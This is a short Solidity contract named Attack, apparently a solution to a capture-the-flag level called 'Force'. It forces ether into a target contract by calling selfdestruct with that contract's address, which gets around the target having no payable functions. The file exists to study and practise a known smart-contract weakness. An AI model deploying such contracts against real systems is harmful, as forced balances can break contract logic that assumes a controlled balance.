//SPDX-License-Identifier:MIT

import "./Force.sol";

pragma solidity ^0.6.0;

contract Attack{
    Force public force;

    constructor(address _forceAddress) public payable{
        force = Force(_forceAddress);
    }

    function attack() public{
        selfdestruct(payable(address(force)));
    }
}